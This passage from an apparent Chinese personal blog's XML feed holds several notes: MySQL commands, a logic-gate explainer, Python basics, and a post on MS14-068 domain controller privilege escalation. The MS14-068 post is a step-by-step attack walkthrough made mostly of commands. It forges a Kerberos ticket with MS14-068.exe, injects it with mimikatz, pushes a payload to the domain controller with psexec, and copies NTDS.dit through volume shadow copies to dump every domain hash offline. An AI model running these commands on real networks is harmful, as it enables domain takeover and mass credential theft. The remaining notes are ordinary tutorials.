class="built_in">enable</span> mariadb  <span class="comment">#设置开机启动</span></span><br><span class="line">mysql_cecure_installation //初始化</span><br><span class="line">mysql -h host_name -uroot -proot  <span class="comment">#-h可为ip或者主机名  扩展：history 可收集密码</span></span><br><span class="line">show databases;     <span class="comment">#显示所有数据库</span></span><br><span class="line">use dbname;    <span class="comment">#选定默认数据库</span></span><br><span class="line">show tables;     <span class="comment">#显示默认数据的所有表</span></span><br><span class="line">desc 表名；       <span class="comment">#显示表结构属性</span></span><br><span class="line">show columns from user <span class="comment">#显示表结构属性</span></span><br><span class="line">create database 数据库名;  <span class="comment">#创建数据库</span></span><br><span class="line">drop database 数据库名;  <span class="comment">#删除数据库</span></span><br><span class="line">drop table <span class="built_in">test</span>； <span class="comment">#删除表</span></span><br><span class="line">use 数据库名;  <span class="comment">#选择数据库</span></span><br><span class="line">mysql <span class="keyword">function</span></span><br><span class="line">database()  <span class="comment">#当前库名</span></span><br><span class="line">version()  <span class="comment">#数据库版本信息</span></span><br><span class="line">user()   <span class="comment">#连接数据库用户的信息</span></span><br><span class="line">@@datadir    <span class="comment">#数据库数据的绝对路径</span></span><br><span class="line">@@basedir   <span class="comment">#数据库文件的绝对路径</span></span><br><span class="line">@@version_compile_os  <span class="comment">#操作系统版本</span></span><br><span class="line">extractvalue/updatexml 更新xml文档</span><br><span class="line">sleep/benchmark  <span class="comment">#休眠时间/性能测试</span></span><br><span class="line"><span class="keyword">if</span>(arg1,arg2,arg3)  <span class="comment">#条件判断</span></span><br><span class="line">ascii <span class="comment">#返回字符的ascii码</span></span><br><span class="line">char    <span class="comment">#从ascii码还原为字符(串)</span></span><br><span class="line">substr/substring/mid  <span class="comment">#截取字符串</span></span><br><span class="line">password     <span class="comment">#mysql5 shal加密明文</span></span><br><span class="line">hex     <span class="comment">#转换为16进制</span></span><br><span class="line">/etc/my.cnf  <span class="comment">#数据库配置文件</span></span><br><span class="line">\c     <span class="comment">#放弃正在输入的命令</span></span><br><span class="line">\h     <span class="comment">#显示命令清单</span></span><br><span class="line">\q     <span class="comment">#退出mysql程序</span></span><br><span class="line">\s     <span class="comment">#查看mysql服务器状态信息</span></span><br></pre></td></tr></table></figure><h2 id="常用数据类型"><a href="#常用数据类型" class="headerlink" title="常用数据类型"></a>常用数据类型</h2><table><thead><tr><th>名称</th><th>类型</th><th>范围</th><th>用途</th></tr></thead><tbody><tr><td>int</td><td>整数型</td><td>(0，4 294 967 295)</td><td>大整数</td></tr><tr><td>float</td><td>浮点型</td><td>很小</td><td>浮点小数</td></tr><tr><td>datetime</td><td>时间型</td><td>YYYY-MM-DD/ HH:MM:SS</td><td>日期/时间</td></tr><tr><td>text</td><td>文本型</td><td>0-65535 bytes</td><td>长文本数据只能默认值为空</td></tr><tr><td>varchar</td><td>字符串</td><td>0-65535 bytes</td><td>变长字符串可有默认值</td></tr></tbody></table><h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><ul><li><strong>创建语句</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名 (列名<span class="number">1</span> 类型<span class="number">1</span> <span class="keyword">not</span> <span class="keyword">null</span> auto_increment <span class="keyword">primary</span> key，列名<span class="number">2</span> 类型<span class="number">2</span>)；</span><br></pre></td></tr></table></figure></li><li><strong>表结构操作</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">修改表名：</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info rename <span class="keyword">as</span> info2；</span><br><span class="line">修改字段：</span><br><span class="line">添加一个字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">add</span> username <span class="type">varchar</span>(<span class="number">255</span>);</span><br><span class="line">删除一个字段</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info <span class="keyword">drop</span> username；</span><br><span class="line">更改字段类型</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info modify col_name data_type</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info modify sex <span class="type">varchar</span>(<span class="number">3</span>);</span><br><span class="line">更改字段名字</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info change col_name1 col_name2 data_type</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> info change sex sexy <span class="type">char</span>(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>插入语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name ( 字段<span class="number">1</span>, 字段<span class="number">2</span>,...字段N )</span><br><span class="line">                       <span class="keyword">VALUES</span></span><br><span class="line">                       ( value1, value2,...valueN ),(<span class="keyword">value</span>，<span class="keyword">value</span>);</span><br></pre></td></tr></table></figure><p>ps:如果数据是字符型，必须使用单引号或者双引号，如：”value”.</p><ul><li><p><strong>查询数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>(上级库).admin（表） <span class="operator">/</span><span class="operator">/</span>跨库查询</span><br><span class="line"><span class="keyword">select</span>  字段<span class="number">1</span>，字段<span class="number">2</span>，字段<span class="number">3</span>，字段N <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure></li><li><p><strong>where语句</strong></p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl <span class="keyword">WHERE</span> runoob_author<span class="operator">=</span><span class="string">&#x27;菜鸟教程 ;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field1, field2,...fieldN <span class="keyword">FROM</span> table_name1, table_name2...</span><br><span class="line">[<span class="keyword">WHERE</span> condition1 [<span class="keyword">AND</span> [<span class="keyword">OR</span>]] condition2.....  #field1先选定 要输出显示的列 <span class="operator">+</span> 表名 <span class="operator">+</span> <span class="keyword">where</span> 条件 <span class="operator">+</span> <span class="keyword">and</span> <span class="keyword">or</span> 条件.  <span class="keyword">DELETE</span> UPDATE可用</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        <span class="keyword">FROM</span> runoob_tbl</span><br><span class="line">        <span class="keyword">WHERE</span> runoob_author<span class="operator">=</span>&quot;RUNOOB.COM&quot;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><strong>update语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE 表名 <span class="keyword">SET</span>  字段<span class="number">1</span><span class="operator">=</span><span class="keyword">new</span><span class="operator">-</span><span class="keyword">value</span>, 字段<span class="number">2</span><span class="operator">=</span><span class="keyword">new</span><span class="operator">-</span>value2</span><br><span class="line"><span class="keyword">WHERE</span> 一个条件或多个条件。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE runoob_tbl <span class="keyword">SET</span> runoob_title<span class="operator">=</span><span class="string">&#x27;学习 C++&#x27;</span> <span class="keyword">WHERE</span> runoob_id<span class="operator">=</span><span class="number">3</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>delete语句</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 一个或多个条件  </span><br></pre></td></tr></table></figure><ul><li><strong>LIKE 子句</strong></li></ul><p>不能单独使用,需要配合where使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 一个或多个条件在 <span class="keyword">LIKE</span> <span class="string">&#x27;%COM&#x27;</span>   </span><br><span class="line">update <span class="keyword">FROM</span> 表 <span class="keyword">SET</span> 一个字段<span class="operator">=</span><span class="keyword">value</span>, <span class="keyword">WHERE</span> 一个或多个条件在 <span class="keyword">LIKE</span> <span class="string">&#x27;%COM&#x27;</span>  </span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 一个或多个条件在 <span class="keyword">LIKE</span> <span class="string">&#x27;%COM&#x27;</span> </span><br></pre></td></tr></table></figure><ul><li> <strong>union语句</strong></li></ul><p>UNION 语句：用于将不同表中相同列中查询的数据展示出来；（不包括重复数据）</p><p>UNION ALL 语句：用于将不同表中相同列中查询的数据展示出来；（包括重复数据）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">UNION</span> <span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名称；</span><br><span class="line"><span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名称；</span><br></pre></td></tr></table></figure><ul><li><strong>排序</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl <span class="keyword">ORDER</span> <span class="keyword">BY</span> submission_date <span class="keyword">ASC</span>;    <span class="operator">/</span>升序</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> runoob_tbl <span class="keyword">ORDER</span> <span class="keyword">BY</span> submission_date <span class="keyword">DESC</span>;   <span class="operator">/</span>降序</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS14-068域控提权</title>
      <link href="/posts/34133/"/>
      <url>/posts/34133/</url>
      
        <content type="html"><![CDATA[<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检测域控中是否有MS14-068漏洞，通过查看是否打补补丁(KB3011780)来判断是否存在漏洞</span><br><span class="line">• 命令：systeminfo |find <span class="string">&quot;3011780”</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user /domain  <span class="comment">#获取</span></span><br><span class="line">ipconfig /all     <span class="comment">#获取域名</span></span><br><span class="line">net time /domain  <span class="comment">#获取主机名</span></span><br><span class="line">域用户的SID     <span class="comment">#可以dump hash 抓出来</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">命令：MS14-068.exe -u 用户名@域名 -p 域用户密码 -s 域用户SID -d DC的IP地址或主机名</span><br><span class="line"></span><br><span class="line">MS14-068.exe -u qqqq@qq.com -p qwer1234!@<span class="comment">#$ -s S-1-5-21-1525956261-1375652688-288367009-1104 -d 192.168.10.2</span></span><br><span class="line">MS14-068.exe -u qqqq@qq.com -p qwer1234!@<span class="comment">#$ -s S-1-5-21-1525956261-1375652688-288367009-1104 -d WIN-VOKC88ABHKA</span></span><br><span class="line"></span><br><span class="line">ms14-068.exe -u qqqq@ICQ.com -p qwer1234!@<span class="comment">#$ -s S-1-5-21-1525956261-1375652688-288367009-1104 -d 192.168.10.2</span></span><br><span class="line"></span><br><span class="line">TGT_qqqq@qq.com.ccache  成功后会在当前目录生成票据文件</span><br></pre></td></tr></table></figure><p>利用 mimikatz.exe 将证书导入。导入之前，清空票据缓存(cmdkey /list /purge)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe:kerberos::ptc C:\Users\ls\TGT_ls@qq.com.ccache</span><br></pre></td></tr></table></figure><p> 提权完成后，使用PsExec.exe获取shell，psexec.exe以管理员权限运行连接域控，可以新建域管理员用户</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec -accepteula  <span class="comment">#隐藏启动</span></span><br><span class="line">psexec.exe \\WIN-VOKC88ABHKA whoami   <span class="comment">#如果命令执行失败 可以考虑直接上马</span></span><br><span class="line">psexec.exe \\WIN-VOKC88ABHKA -d -c payload.exe   <span class="comment">#隐藏启动进程 否则会执行不成功</span></span><br></pre></td></tr></table></figure><p>执行成功上线后,当前用户即是域管理员用户,可以任意添加域管理员.</p><h2 id="卷影备份下载NTDS-dit"><a href="#卷影备份下载NTDS-dit" class="headerlink" title="卷影备份下载NTDS.dit"></a>卷影备份下载NTDS.dit</h2><p>利用卷影备份,下载两个文件到本地离线破解, NTDS.dit,SYSTEM</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /<span class="keyword">for</span>=C：    <span class="comment">#创建卷影</span></span><br><span class="line"></span><br><span class="line">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1    <span class="comment">#获得地址</span></span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\NTDS.dit C:\Users     <span class="comment">#copy到c:\users目录</span></span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SYSTEM C:\Users <span class="comment">#copy到c:\users目录</span></span><br></pre></td></tr></table></figure><p>本地利用 impacket包secretsdump.py 导出hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -ntds /root/ntds.dit -system /root/system LOCAL  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>与、或、非、与非、或非、异或、同或</title>
      <link href="/posts/49591/"/>
      <url>/posts/49591/</url>
      
        <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">与：and &amp;&amp; -&gt;逻辑乘法 有<span class="number">0</span>出<span class="number">0</span>；全<span class="number">1</span>出<span class="number">1</span> 例：<span class="number">00</span>=<span class="number">0</span>,<span class="number">01</span>=<span class="number">0</span>,<span class="number">10</span>=<span class="number">0</span>,<span class="number">11</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">或：or  || -&gt;逻辑加法 有<span class="number">1</span>出<span class="number">1</span>，全<span class="number">0</span>出<span class="number">0</span> 例：<span class="number">00</span>=<span class="number">0</span>,<span class="number">01</span>=<span class="number">1</span>,<span class="number">10</span>=<span class="number">1</span>,<span class="number">11</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">非：not !  -&gt;逻辑否定 有<span class="number">1</span>出<span class="number">0</span>，有<span class="number">0</span>出<span class="number">1</span> 取相反值</span><br><span class="line"></span><br><span class="line">与非：nand-&gt;先按与的操作，然后结果取反 例:<span class="number">00</span>=<span class="number">1</span>,<span class="number">01</span>=<span class="number">1</span>,<span class="number">10</span>=<span class="number">1</span>,<span class="number">11</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">或非：nor-&gt;先按或的操作，然后结果取反 例:<span class="number">00</span>=<span class="number">1</span>,<span class="number">01</span>=<span class="number">0</span>,<span class="number">10</span>=<span class="number">0</span>,<span class="number">11</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">异或：xor-&gt;相同得<span class="number">0</span>;相异得<span class="number">1</span> 例:<span class="number">00</span>=<span class="number">0</span>,<span class="number">01</span>=<span class="number">1</span>,<span class="number">10</span>=<span class="number">1</span>,<span class="number">11</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">同或：xnor-&gt;相同得<span class="number">1</span>;相异得<span class="number">0</span> 例:<span class="number">00</span>=<span class="number">1</span>,<span class="number">01</span>=<span class="number">0</span>,<span class="number">10</span>=<span class="number">0</span> <span class="number">11</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>首先记住与、或、非。与非、或非只需要先按照与、或判断，再非一下。异或、与或关键词在于《异：不同》为1、《与：相同》为1。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 基础</title>
      <link href="/posts/21759/"/>
      <url>/posts/21759/</url>
      
        <content type="html"><![CDATA[<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="string">&quot;hello&quot;</span>  <span class="comment">#定义变量</span></span><br><span class="line">y=<span class="string">&quot;b&quot;</span></span><br><span class="line">a = b = c = <span class="number">1</span><span class="comment">#为多个变量赋值</span></span><br><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;john&quot;</span><span class="comment">#为多个变量赋值</span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#!/usr/bin/python        #linux 指定解析器</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-   </span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment"># 第一个注释           #单行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;  #多行注释</span></span><br><span class="line"><span class="string">多行</span></span><br><span class="line"><span class="string">多行</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">#python没有不用&#123;&#125; 来表示代码块,用的是行和缩进,行之间的缩进需要一致,需要用tab统一缩进,代表一个代码块.</span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">import</span> sys; x = <span class="string">&#x27;hello&#x27;</span>;sys.stdout.write(x + <span class="string">&#x27;\n&#x27;</span>)   <span class="comment">#单行多条语句使用;号</span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">#函数之间或类的方法之间用空行分隔，表示一段新的代码的开始,空行也是程序代码的一部分。</span></span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"><span class="built_in">print</span> y, <span class="comment">#输出默认换行.加,换行输出. </span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;按下 enter 键退出，其他任意键显示...\n&quot;</span>)     <span class="comment">#\换行,enter退出,默认等待输入</span></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">word = <span class="string">&#x27;word&#x27;</span><span class="comment">#用单引号表示字符串</span></span><br><span class="line">sentence = <span class="string">&quot;这是一个句子。&quot;</span><span class="comment">#用双引号表示字符串</span></span><br><span class="line">paragraph = <span class="string">&quot;&quot;&quot;这是一个段落。#用三引号表示多行字符串</span></span><br><span class="line"><span class="string">包含了多个语句&quot;&quot;&quot;</span></span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">if</span> expression : <span class="comment">#缩进相同表示代码组,首行以关键字开始，以冒号( : )结束</span></span><br><span class="line">   suite </span><br><span class="line"><span class="keyword">elif</span> expression :  </span><br><span class="line">   suite  </span><br><span class="line"><span class="keyword">else</span> :  </span><br><span class="line">   suite </span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"><span class="built_in">print</span> (a+b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (a,b)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;a&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&quot;b&quot;</span>)   <span class="comment">#三种字符串拼接</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#字符串格式化:</span></span><br><span class="line">%s 格式化字符串  %d 格式化整数  %f 格式化浮点</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;oo&#x27;</span></span><br><span class="line"><span class="built_in">print</span> (%s<span class="string">&#x27;aadda&#x27;</span>)%a</span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Hello World!&#x27;</span>                <span class="comment">#定义字符串</span></span><br><span class="line"><span class="comment">#字符串切片</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>[<span class="number">2</span>:<span class="number">5</span>]      <span class="comment"># 输出字符串中第三个至第六个之间的字符串</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>[<span class="number">0</span>]      <span class="comment"># 输出字符串中第一字符串</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span> * <span class="number">2</span>       <span class="comment"># 输出字符串两次</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>[<span class="number">2</span>:]       <span class="comment"># 输出从第三个字符开始的字符串</span></span><br><span class="line">----------------------------------------------------------------------------------------- <span class="built_in">print</span> <span class="string">u&#x27;Hello\u0020World !&#x27;</span>        <span class="comment">#定义一个 Unicode 字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span>    <span class="comment">#便是占据一个位置,空函数的时候使用</span></span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>()</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure><h2 id="Python列表"><a href="#Python列表" class="headerlink" title="Python列表"></a>Python列表</h2><p>List（列表） 是 Python 中使用最频繁的数据类型。列表用 <strong>[ ]</strong> 标识，是 python 最通用的复合数据类型。</p><p>列表可以完成大多数集合类的数据结构实现。它支持字符，数字，字符串甚至可以包含列表（即嵌套）。</p><p>列表中值的切割也可以用到变量 **[头下标:尾下标]**。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [ <span class="string">&#x27;dashuaibi&#x27;</span>, <span class="number">786</span> , <span class="number">2.23</span>, <span class="string">&#x27;john&#x27;</span>, <span class="number">70.2</span> ]</span><br><span class="line">tinylist = [<span class="number">123</span>, <span class="string">&#x27;john&#x27;</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span>               <span class="comment"># 输出完整列表</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span>[<span class="number">0</span>]            <span class="comment"># 输出列表的第一个元素</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span>[<span class="number">1</span>:<span class="number">3</span>]          <span class="comment"># 输出第二个至第三个元素 </span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span>[<span class="number">2</span>:]           <span class="comment"># 输出从第三个开始至列表末尾的所有元素</span></span><br><span class="line"><span class="built_in">print</span> tinylist * <span class="number">2</span>       <span class="comment"># 输出列表两次</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">list</span> + tinylist    <span class="comment"># 打印组合的列表</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>.append(<span class="string">&#x27;Runoob&#x27;</span>) <span class="comment">#添加一个列表函数</span></span><br><span class="line"><span class="keyword">del</span> list1[<span class="number">2</span>] <span class="comment">#删除一个列表函数</span></span><br></pre></td></tr></table></figure><p><strong>Python列表函数&amp;方法</strong></p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>cmp(list1, list2)</td><td>比较两个列表的元素</td></tr><tr><td>len(list)</td><td>列表元素个数</td></tr><tr><td>max(list)</td><td>返回列表元素最大值</td></tr><tr><td>min(list)</td><td>返回列表元素最小值</td></tr><tr><td>list(seq)</td><td>将元组转换为列表</td></tr></tbody></table><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>list.append(obj)</td><td>在列表末尾添加新的对象</td></tr><tr><td>list.count(obj)</td><td>统计某个元素在列表中出现的次数</td></tr><tr><td>list.extend(seq)</td><td>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td>list.index(obj)</td><td>从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td>list.insert(index, obj)</td><td>将对象插入列表</td></tr><tr><td>list.pop([index=-1])</td><td>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td>list.remove(obj)</td><td>移除列表中某个值的第一个匹配项</td></tr><tr><td>list.reverse()</td><td>反向列表中元素</td></tr><tr><td>list.sort(cmp=None, key=None, reverse=False)</td><td>对原列表进行排序</td></tr></tbody></table><h2 id="Python-元组"><a href="#Python-元组" class="headerlink" title="Python 元组"></a>Python 元组</h2><p>元组是另一个数据类型，类似于 List（列表）。</p><p>元组用 <strong>()</strong> 标识。内部元素用逗号隔开。但是元组不能二次赋值，相当于只读列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">tuple</span> = ( <span class="string">&#x27;runoob&#x27;</span>, <span class="number">786</span> , <span class="number">2.23</span>, <span class="string">&#x27;john&#x27;</span>, <span class="number">70.2</span> )</span><br><span class="line">tinytuple = (<span class="number">123</span>, <span class="string">&#x27;john&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> 